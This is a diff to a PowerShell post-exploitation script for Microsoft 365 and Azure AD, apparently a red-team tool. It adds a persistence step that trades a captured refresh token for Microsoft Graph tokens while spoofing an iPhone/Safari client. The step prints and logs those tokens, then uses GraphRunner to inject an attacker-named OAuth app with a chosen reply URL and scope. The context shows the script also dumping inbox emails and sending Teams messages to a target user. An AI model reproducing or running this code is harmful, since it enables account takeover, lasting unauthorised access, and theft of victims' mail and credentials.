@@ -7,15 +7,41 @@ param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [switch]$azureAd,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [switch]$persistence,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$targetUser,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$firstUser,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$messageContent, 
     [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$subject
+    [string]$subject,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$ReplyUrl,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$AppName,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$Scope
 
 )
+
+function New-TokensObject {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$AccessToken,
+        
+        [Parameter(Mandatory=$true)]
+        [string]$RefreshToken
+    )
+
+    $tokens = New-Object PSObject -Property @{
+        access_token = $AccessToken
+        refresh_token = $RefreshToken
+    }
+
+    return $tokens
+}
+
 
 $modules = .\Scripts\Import.ps1
 
@@ -85,6 +111,47 @@ if ($azureHound) {
         # exit 1
     }
 }
+
+# if ($persistence) {
+#     try {
+#         Write-Output "Starting OAuth Injection module..."
+#         .\Modules\Inject-OAuthApp.ps1 -response $response -AppName $AppName -ReplyUrl $ReplyUrl -Scope $Scope 
+#     }
+#     catch {
+#         Write-Error "An error occurred in the persistence block: $_"
+#         # Optionally, you can exit the script here
+#         # exit 1
+#     }
+# }
+
+# if ($persistence) {
+#     try {
+        Write-Output "Injecting OAuth App for Persistence (Phirst.ps1)"
+
+        Start-Transcript -Path ".\PersistenceApps.json" -Append
+        $tokz = Invoke-RefreshToMSGraphToken -domain $domain -refreshToken $refresh -Device iPhone -Browser Safari
+
+        # Assuming $response is an object with access_token and refresh_token
+        if ($tokz) {
+            $tokens = New-TokensObject -AccessToken $tokz.access_token -RefreshToken $tokz.refresh_token
+            # Output the tokens for verification (optional)
+            Write-Host "Access Token from tokens object: $($tokens.access_token)"
+            Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
+        }
+        Import-Module .\Modules\GraphRunner.ps1
+        Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token
+        Invoke-InjectOAuthApp -AppName $AppName -ReplyUrl $ReplyUrl -scope $Scope -Tokens $tokens # *> .\Persistence.json 
+        Stop-Transcript
+
+#     catch {
+#             Write-Error "An error occurred in the persistence block: $_"
+#             # Optionally, you can exit the script here
+#             # exit 1
+#         }
+#     }
+# }
+
+
 
 ### Refresh to Graph, Dump emails
 Write-Output "Dumping last 200 emails from inbox"
@@ -179,3 +246,17 @@ if ($targetUser) {
 } else {
     Write-Host "No Teams user specified. Skipping message sending."
 }
+
+
+# # Persistence
+# if ($persistence) {
+#     try {
+#         Write-Output "Starting OAuth Injection module..."
+#         .\Modules\Inject-OAuthApp.ps1 -response $response -AppName $AppName -ReplyUrl $ReplyUrl -Scope $Scope 
+#     }
+#     catch {
+#         Write-Error "An error occurred in the AzureHound block: $_"
+#         # Optionally, you can exit the script here
+#         # exit 1
+#     }
+# }
